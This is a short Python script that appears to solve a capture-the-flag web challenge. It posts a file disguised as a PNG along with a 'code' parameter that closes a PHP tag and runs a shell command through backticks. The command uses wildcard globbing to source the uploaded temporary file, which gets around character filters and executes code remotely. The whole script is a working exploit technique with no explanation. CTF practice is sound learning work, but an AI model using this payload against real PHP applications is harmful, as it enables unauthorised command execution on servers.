import requests 
files={'file':("1.php","getFlag()","image/png")}
url="http://80.endpoint-62a9a5f0b67d47848f848f97e0d112a2.m.ins.cloud.dasctf.com:81/?code=?><?=`. /???/????????[?-[]`;"
r = requests.post(url,files=files)
print(r.text)